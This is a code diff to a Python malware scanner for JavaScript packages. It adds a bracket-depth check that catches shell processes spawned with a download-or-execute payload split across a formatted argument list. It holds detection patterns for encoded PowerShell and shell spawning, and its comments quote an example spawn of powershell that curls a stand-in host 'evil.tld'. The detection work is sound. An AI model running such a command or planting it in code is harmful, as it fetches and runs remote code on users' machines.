@@ -73,7 +73,17 @@ import difflib
 import re
 from dataclasses import dataclass, field
 from enum import Enum
-from typing import Any, Dict, Iterable, List, Mapping, Sequence, Tuple
+from typing import (
+    Any,
+    Callable,
+    Dict,
+    Iterable,
+    List,
+    Mapping,
+    Optional,
+    Sequence,
+    Tuple,
+)
 
 # ---------------------------------------------------------------------------
 # Verdict
@@ -644,12 +654,20 @@ class MalwarePattern:
     matched every anonymous ``function(a, b)`` in the language (193 hits on
     lodash alone). ``requires`` names a co-occurrence gate that must also be
     present in the same file — the discipline the ``AGENT-*`` rules already use.
+
+    ``structural`` is a second reader for the SAME description, for the one
+    shape a regex cannot express (F58): a bound that depends on bracket depth
+    rather than on characters. It runs only when ``regex`` found nothing, so it
+    can add hits and never remove one, and the pattern's own calibration is
+    unaffected. A rule needs one only when its window has to follow the source's
+    structure — everything else stays a regex.
     """
 
     regex: str
     description: str
     ignore_case: bool = True
     requires: str = ""
+    structural: Optional[Callable[[str], bool]] = None
 
 
 #: A file only gets credit for a command-execution hit when it actually binds
@@ -801,6 +819,133 @@ _SHELL_PAYLOAD = (
 #: into :data:`_SHELL_PAYLOAD`, because ``-ec`` and ``-e`` are also POSIX shell
 #: flags: ``bash -ec "npm run build"`` is a real build idiom.
 _POWERSHELL_ENCODED = r"-(?:enc|ec|e)\b|EncodedCommand|FromBase64String"
+
+# ---------------------------------------------------------------------------
+# The shape a regex cannot reach: a payload behind an `=` or `;` that is still
+# inside the call's own argv (F58)
+# ---------------------------------------------------------------------------
+#
+# F43's second branch walks into the following lines only across material that
+# cannot be a *different* statement — no `;`, no `=`, no `{}`, no `()`. That
+# exclusion is what stops it reading the next statement's `curl` as this call's
+# payload, and its price is exact: a payload whose argv *contains* one of those
+# characters before the payload token is missed when the call is split over
+# lines. `spawn("powershell.exe", [\n "-Command",\n "$u='http://evil.tld'; curl
+# $u"\n])` yields nothing, while the identical call on ONE line matches — the
+# first branch's window is `[^\n]{0,200}?`, which crosses `=` and `;` freely.
+#
+# So the asymmetry F43 set out to remove survives inside its own chosen class:
+# the same call reads differently depending only on whether prettier touched it.
+# Closing it is not a wider character class — `=` genuinely does end the reach
+# in flat text. It is a *bound the regex cannot express*: an `=` inside the
+# call's own parentheses is not a new statement, and one outside them always is.
+#
+# A bracket scan expresses exactly that, and it is a tighter bound than the
+# regex it supplements rather than a looser one. The first branch may read 200
+# characters of whatever follows on the line, including the start of the next
+# statement when the call ended mid-line; this stops at the `)` that closes the
+# call, so it CANNOT reach another statement at all. What it adds over today is
+# one class and no more: an argv written across lines whose payload sits behind
+# a `=` or `;` — which the one-line spelling of the same call already reports.
+#
+# It supplements the pattern instead of replacing it: the calibrated regex is
+# untouched, so every measurement behind it still holds, and this can only add
+# hits. It also runs only when that regex found nothing (see
+# :func:`scan_text_for_malware_patterns`), so a file it already flags costs
+# nothing extra.
+
+#: :data:`_PROCESS_CALL`'s call names with their shared prefixes factored out.
+#:
+#: The two accept **exactly** the same set — ``exec``, ``execSync``,
+#: ``execFile``, ``execFileSync``, ``spawn``, ``spawnSync`` — and a test asserts
+#: it, because a name added to one and not the other is a silent hole. The
+#: spelling differs only for speed: a flat six-way alternation makes CPython
+#: retry each branch at every candidate offset, and factoring the two real
+#: prefixes cut this scan from 0.69s to 0.49s over 19.1 MB of real bundles for
+#: an identical verdict on every file. :data:`_PROCESS_CALL` itself is left
+#: alone — it is the calibrated pattern's text, and re-spelling it is a change
+#: to the shipped rule rather than to this one.
+_PROCESS_CALL_FACTORED = (
+    r"\b(?:exec(?:Sync|File(?:Sync)?)?|spawn(?:Sync)?)\s*\(\s*['\"`]"
+)
+
+#: The shape this scan applies to: a process call whose FIRST argument is a
+#: shell binary, which is the only form that can be followed by a formatted
+#: argv. Anchored immediately after the opening quote — the same anchoring the
+#: no-command arm uses — so ``execSync('npm publish … && curl …')`` cannot enter
+#: through the ``sh`` at the end of ``publish``.
+_SHELL_ARGV_ANCHOR = re.compile(
+    _PROCESS_CALL_FACTORED + r"\s*(?P<binary>(?:" + _SHELL_BINARY + r"))",
+    re.IGNORECASE,
+)
+
+_SHELL_PAYLOAD_RE = re.compile(_SHELL_PAYLOAD, re.IGNORECASE)
+_POWERSHELL_ENCODED_RE = re.compile(_POWERSHELL_ENCODED, re.IGNORECASE)
+_POWERSHELL_RE = re.compile(_POWERSHELL, re.IGNORECASE)
+
+#: The byte budget for one such scan, spelled as the regex's own budget so the
+#: two cannot drift: at most :data:`SHELL_COMMAND_WINDOW` per line across the
+#: first line plus :data:`SHELL_ARGV_LINES` more.
+_SHELL_ARGV_SPAN = SHELL_COMMAND_WINDOW * (SHELL_ARGV_LINES + 1)
+
+
+def _call_argument_span(content: str, start: int) -> str:
+    """The rest of the enclosing call's argument list, read from ``start``.
+
+    ``start`` sits just past the shell binary inside a call whose ``(`` is
+    already open, so the counter starts at depth 1 and the scan ends at the
+    ``)`` that returns it to 0 — the call's own end. Brackets and braces count
+    too, so a nested ``[…]`` or ``{…}`` inside the argv cannot close it early.
+
+    Two bounds keep this from becoming a file-wide search when the call never
+    closes (an unbalanced quote, a bracket inside a string literal): the same
+    :data:`SHELL_ARGV_LINES` line budget the regex uses, and
+    :data:`_SHELL_ARGV_SPAN` bytes.
+
+    Quotes are deliberately NOT tracked. A ``)`` inside a string literal ends
+    the span early, which under-reads and can only *lose* a hit; tracking them
+    would mean a JavaScript tokenizer (template literals, escapes, regex
+    literals) for a check whose entire job is to be cheaper than one.
+    """
+    depth = 1
+    lines = 0
+    limit = min(len(content), start + _SHELL_ARGV_SPAN)
+    index = start
+    while index < limit:
+        char = content[index]
+        if char == "\n":
+            lines += 1
+            if lines > SHELL_ARGV_LINES:
+                break
+        elif char in "([{":
+            depth += 1
+        elif char in ")]}":
+            depth -= 1
+            if depth == 0:
+                index += 1
+                break
+        index += 1
+    return content[start:index]
+
+
+def _shell_argv_carries_a_payload(content: str) -> bool:
+    """Whether a shell is spawned with a payload inside its own argument list.
+
+    The regex arms this supplements decide the same question over flat text;
+    this one decides it over the call's bracket structure, so an ``=`` or ``;``
+    written inside the argv no longer ends the reach.
+    """
+    for match in _SHELL_ARGV_ANCHOR.finditer(content):
+        span = _call_argument_span(content, match.end())
+        if _SHELL_PAYLOAD_RE.search(span):
+            return True
+        # The encoded-payload flags are ambiguous outside PowerShell (`bash -ec
+        # "npm run build"`), so they count only when PowerShell is the binary.
+        if _POWERSHELL_RE.fullmatch(match.group("binary")) and (
+            _POWERSHELL_ENCODED_RE.search(span)
+        ):
+            return True
+    return False
 
 #: How far from a weak input-capture noun (``keystrokes``, ``keylog``) the
 #: corroborating verb may sit. A line bound, like every other window here, and
@@ -964,7 +1109,10 @@ MALWARE_PATTERN_TABLE: Tuple[MalwarePattern, ...] = (
     #   the command line is what catches `execFile('cmd.exe', ['/c', 'curl …'])`,
     #   which the old first-literal-only pattern could not see — and reading it
     #   across a formatted argv (F43, :data:`_SHELL_COMMAND_GAP`) is what keeps
-    #   that true of source and not only of bundles.
+    #   that true of source and not only of bundles. The remaining formatted
+    #   shape — a payload behind an ``=`` or ``;`` that is still inside the
+    #   call's own argv — is read by :func:`_shell_argv_carries_a_payload`
+    #   (F58), because a bracket depth is not a character class.
     #
     # The union fires on zero of those 2,080 packages and on every malicious
     # fixture, and costs nothing: 0.88s vs the old 1.07s over 23.5 MB of real
@@ -982,6 +1130,7 @@ MALWARE_PATTERN_TABLE: Tuple[MalwarePattern, ...] = (
         r")"
         r")",
         "shell process spawned",
+        structural=_shell_argv_carries_a_payload,
     ),
     # A command string that fetches and immediately executes. The install-script
     # phase already flags this shape in a lifecycle hook; installed code can run
@@ -1146,6 +1295,10 @@ def scan_text_for_malware_patterns(content: str) -> List[str]:
     """Descriptions of every malware pattern present in ``content``.
 
     Order follows :data:`MALWARE_PATTERN_TABLE` so a report is deterministic.
+
+    A pattern's ``structural`` reader is consulted only after its regex missed
+    (F58): a file the regex already flags pays nothing for it, and the ordering
+    above is what the description lands in either way.
     """
     if not content:
         return []
@@ -1154,7 +1307,10 @@ def scan_text_for_malware_patterns(content: str) -> List[str]:
         pattern.description
         for compiled, pattern in _COMPILED_MALWARE_PATTERNS
         if (not pattern.requires or _gate_is_open(pattern.requires, content, gates))
-        and compiled.search(content)
+        and (
+            compiled.search(content)
+            or (pattern.structural is not None and pattern.structural(content))
+        )
     ]
 
 
